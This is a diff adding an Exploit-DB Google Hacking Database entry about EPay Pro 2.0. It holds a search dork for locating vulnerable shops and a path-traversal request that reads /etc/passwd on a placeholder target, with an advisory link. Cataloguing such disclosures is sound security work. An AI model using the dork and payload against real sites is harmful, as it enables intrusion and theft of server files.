@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/1060
+Category:         Advisories and Vulnerabilities
+Published Date:   2005-08-10
+Author:           anonymous
+GoogleDork:       inurl:index.php fees shop link.codes merchantAccount
+Description:      inurl:index.php fees shop link.codes merchantAccount
+
+
+Vulnerability in EPay systemsPHP code includinghttp://targeturl/index.php?read=../../../../../../../../../../../../../../etc/passwdadvisory:http://www.cyberlords.net/advisories/cl_epay.txtEPay Pro version 2.0 is vulnerable to this issue.
